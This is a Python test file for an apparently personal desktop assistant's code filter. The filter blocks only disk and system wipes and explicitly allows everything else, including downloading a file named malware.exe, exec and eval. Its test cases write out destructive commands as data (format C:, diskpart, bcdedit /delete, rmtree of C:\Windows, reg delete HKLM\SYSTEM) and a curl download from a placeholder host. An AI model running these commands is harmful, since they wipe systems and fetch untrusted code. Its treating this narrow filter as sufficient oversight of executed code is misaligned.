"""
Anti-wipe filter tests.

Policy: block ONLY system wipe (format/diskpart/bcdedit, C:\\Windows…) and
recursive deletion of protected roots (this repo, the vault, drive roots, system
registry hives). EVERYTHING else runs — including 'malware', exec/eval, downloads,
and rmtree of ordinary folders. No voice confirm, no content moderation.

Run: python test_safety.py
"""
import sys
import tempfile
import types
from pathlib import Path

sys.stdout.reconfigure(encoding="utf-8")

_m = types.ModuleType("pyautogui")
for _a in ("size", "click", "press", "hotkey", "moveTo"):
    setattr(_m, _a, lambda *x, **k: None)
sys.modules.setdefault("pyautogui", _m)

from jarvis import is_code_safe

CASES = [
    ("rmtree C:\\Windows",           r'import shutil; shutil.rmtree(r"C:\Windows")', True),
    ("format C:",                    'subprocess.run("format C: /q")', True),
    ("diskpart",                     'subprocess.run("diskpart /s script.txt")', True),
    ("bcdedit",                      'subprocess.run("bcdedit /delete")', True),
    ("wipe the JARVIS repo",         r'shutil.rmtree(r"C:\Users\user\Documents\JARVIS")', True),
    ("wipe the Obsidian vault",      r'shutil.rmtree("C:/Users/user/Documents/Obsidian Vault")', True),
    ("Remove-Item Windows -Recurse", r'Remove-Item C:\Windows -Recurse -Force', True),
    ("reg delete HKLM\\SYSTEM",      r'reg delete "HKLM\SYSTEM\Foo" /f', True),
    ("wipe a whole drive root",      r'shutil.rmtree("C:\\")', True),
    ("empty code",                   '', True),
    ("pyautogui automation",         'import pyautogui; pyautogui.moveTo(400, 300)', False),
    ("open calc",                    'subprocess.Popen("calc.exe")', False),
    ("single-file delete on Desktop", r'import os; os.remove(r"C:\Users\user\Desktop\a.txt")', False),
    ("download an exe ('malware')",  'subprocess.call("curl -o malware.exe https://x/y.exe")', False),
    ("rmtree of Downloads",          'import shutil; shutil.rmtree("C:/Users/user/Downloads")', False),
    ("rmtree of an ordinary folder", 'shutil.rmtree("/some/temp/path")', False),
    ("exec()",                       "exec('import os')", False),
    ("eval()",                       "eval('1+1')", False),
    ("str.format (not disk format)", 'print("{:.2f}".format(3.14))', False),
]

fails = []
print("=== Anti-wipe filter (block ONLY wipe; allow everything else) ===\n")
for desc, code, expect_block in CASES:
    ok, reason = is_code_safe(code)
    blocked = not ok
    good = blocked == expect_block
    exp = "BLOCK" if expect_block else "ALLOW"
    got = "BLOCK" if blocked else "ALLOW"
    print(f"  {'OK  ' if good else 'FAIL'} [{exp}->{got}] {desc}"
          + (f"  ({reason})" if blocked else ""))
    if not good:
        fails.append(desc)

with tempfile.TemporaryDirectory(prefix="jarvis-safety-project-") as tmp:
    project = Path(tmp) / "checkout"
    (project / ".git").mkdir(parents=True)
    ok, reason = is_code_safe(f'shutil.rmtree({str(project)!r})')
    good = not ok and "проекта" in reason
    print(f"  {'OK  ' if good else 'FAIL'} [BLOCK->{'BLOCK' if not ok else 'ALLOW'}] git project")
    if not good:
        fails.append("git project")

print("\n" + "=" * 60)
print(f"{len(CASES) - len(fails)}/{len(CASES)} верно"
      + ("" if not fails else f"   ПРОВАЛЫ: {fails}"))
sys.exit(1 if fails else 0)
